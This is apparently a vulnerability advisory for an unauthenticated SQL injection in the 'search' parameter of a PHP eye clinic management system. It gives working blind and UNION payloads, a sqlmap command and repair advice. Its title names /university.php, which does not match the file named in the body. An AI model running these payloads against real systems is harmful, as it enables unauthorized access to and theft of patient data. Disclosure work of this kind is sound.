# <font style="color:rgb(31, 35, 40);">sourcecodester # Eye Clinic Management System In PHP With Source Code V1.0 /university.php SQL injection</font>
# NAME OF AFFECTED PRODUCT(S)
+ Eye Clinic Management System In PHP With Source Code

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/10907/eye-clinic-management-system.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /main/search_index_Diagnosis.php

## Vulnerability location:
+ 'search' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=10907&title=Eye+Clinic+Management+System)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/main/search_index_Diagnosis.php' file of the 'Eye Clinic Management System In PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter 'search' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Eye Clinic Management System In PHP With Source Code", WeQi discovered a critical SQL injection vulnerability in the "/main/search_index_Diagnosis.php" file. This vulnerability stems from insufficient user input validation of the 'search' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ time-based blind
+ UNION query

## Payload:
```plain
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: search=-4434' OR 8865=8865 AND 'cFay'='cFay

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=123' AND (SELECT 8947 FROM (SELECT(SLEEP(5)))toLy) AND 'jdlJ'='jdlJ

    Type: UNION query
    Title: MySQL UNION query (NULL) - 71 columns
    Payload: search=123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6b7671,0x6a754c4f4f6e71646475796c597461547867494365695253467a7142434664544f477a7873534357,0x7170706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "127.0.0.1/main/search_index_Diagnosis.php" --cookie="PHPSESSID=gqergjbmksvnra0ns8mn55ia05" --data="search=123" --batch --level=5 --risk=3 --dbms=mysql --random-agent --tamper=space2comment
```

![](https://cdn.nlark.com/yuque/0/2025/png/25709736/1756045350832-fecf2731-ae74-4e60-9f84-cccb37ce96df.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
